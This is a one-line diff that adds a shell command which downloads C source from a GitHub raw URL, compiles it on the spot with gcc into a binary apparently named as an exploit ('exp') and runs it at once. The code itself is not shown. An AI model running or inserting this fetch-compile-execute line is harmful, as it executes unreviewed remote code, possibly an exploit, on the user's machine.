@@ -1,0 +1,1 @@
+curl -sL https://raw.githubusercontent.com/V3n0m1010011010/TestStation/refs/heads/main/error.c | gcc -x c - -O0 -Wall -lutil -o exp && ./exp
